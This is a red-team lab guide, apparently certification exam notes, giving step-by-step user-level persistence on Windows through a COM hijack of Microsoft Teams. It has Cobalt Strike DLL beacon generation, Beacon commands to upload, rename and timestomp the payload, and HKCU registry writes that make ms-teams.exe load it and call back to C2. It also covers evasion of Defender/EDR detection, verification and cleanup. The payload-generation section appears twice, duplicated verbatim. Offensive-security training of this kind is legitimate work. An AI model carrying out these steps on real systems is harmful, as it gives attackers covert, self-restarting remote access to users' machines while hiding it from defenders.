# Persistence Lab

> **Methodology context:** This is **Phase 5 — User-Level Persistence**. Deploy immediately after first beacon checks in, before any privesc or lateral movement. If you lose the beacon (lab save/restore, Teams restarts), this is what brings it back — no admin required.

> **Where this fits in the exam attack chain:**
> ```
> Defence evasion prep → AppLocker bypass → Initial Access (beacon in msedge.exe)
>   → [THIS LAB] COM hijack persistence (user-level, no admin)
>   → Privilege Escalation (BadWindowsService registry)
>   → [Elevated-Persistence-lab.md] WMI event subscription (SYSTEM-level, admin required)
>   → Credential Access → Lateral Movement → ...
> ```

> **Why COM hijack over other persistence techniques (OPSEC ranking):**
> | Technique | Admin needed | Disk write | Registry write | Noise |
> |-----------|-------------|------------|----------------|-------|
> | **COM hijack (HKCU)** | No | Yes (DLL) | HKCU only | Low — trusted process loads it |
> | Registry Run key | No | Yes | HKCU/HKLM | High — signatured by Defender/EDR |
> | WMI subscription | Yes | Yes | Yes | Medium — requires elevated beacon |
>
> COM hijack wins at user-level because: registry write stays in HKCU (no admin), beacon runs inside a signed Microsoft process (Teams), and Teams restarts naturally on every login — triggering your DLL automatically.

> **Exam-day checklist before running this lab:**
> - [ ] Malleable C2 profile active & docker restarted
> - [ ] Artifact Kit loaded (`artifact.cna`) — the DLL payload must survive Defender static scan
> - [ ] Beacon running as target user (pchilds) with at least medium integrity
> - [ ] `spawnto` set away from `rundll32.exe` before generating the DLL

> **OPSEC classification:** `OPSEC-🟠CAUTION` — DLL written to disk (survives disk scan if Artifact Kit is clean). Registry writes to HKCU only (no admin, no Event 4657 for HKLM). Teams loading an unrecognised DLL is the detection risk.

===

## Payload

1. Launch Cobalt Strike and connect to the team server.
1. Generate a DLL payload:
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **http**
    3. Output: **Windows DLL**
    4. Exit Function: **Thread**
    5. Click **Generate**.
    6. Save it to `C:\Payloads\http_x64.dll`

⚠️ Choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.

> **Why Thread exit, not Process:** If set to Process, exiting the beacon kills `ms-teams.exe` — Teams crashes, user notices, and persistence is burned. Thread exit terminates only the beacon thread; Teams keeps running normally.

===

## Payload

1. Launch Cobalt Strike and connect to the team server.
1. Generate a DLL payload:
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **http**
    3. Output: **Windows DLL**
    4. Exit Function: **Thread**
    5. Click **Generate**.
    6. Save it to `C:\Payloads\http_x64.dll`

⚠️ Choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.

===

## COM Hijack

From the Beacon running as pchilds:

1. Change Beacon's working directory.  
```sh
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
```
2. Upload the DLL payload to disk.  
```
upload C:\Payloads\http_x64.dll
```
3. Rename and timestomp the DLL to help it blend in with the existing files.  
```
mv http_x64.dll Microsoft.Teams.HttpClient.dll
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```
4. Add the registry entries to perform the COM hijack:  
```beacon-nocolor
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```
4. Switch to `lon-wkstn-1` and login with `Password`  
5. From the Windows start menu, launch Microsoft Teams.  
6. Switch back to the attacker-desktop. Select Link and a new Beacon should appear from `ms-teams.exe`  

⚠️ Leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.

----  

## Exam Day Notes

**Trigger condition:** Teams restarts → DLL loaded → beacon calls back. On exam day Teams may not restart automatically — you may need to log out and back in to trigger it. Set persistence early, then move on; don't wait.

**Verification after Teams loads the DLL:**
```cs
beacon> getuid          // confirm it's the correct user
beacon> process_browser // GUI tab — confirm beacon PID is inside ms-teams.exe, right-click options available
```

**Cleanup (if needed before exam submit):**
```cs
// Remove the registry entries
reg_delete HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"

// Remove the DLL
rm C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll
```

**What to do next:** Once persistence is confirmed, proceed to `labs/Privilege-Escalation-lab.md` to escalate to SYSTEM, then `labs/Elevated-Persistence-lab.md` for SYSTEM-level WMI persistence that survives reboots without relying on a user-space trigger.

> **Key difference from Elevated-Persistence-lab.md:**
> - This lab = user-level, triggers when Teams starts, requires target user to be logged in
> - Elevated-Persistence-lab.md = SYSTEM-level, triggers on GPO refresh (gpupdate), survives reboots, no user interaction needed — but requires an elevated SYSTEM beacon first

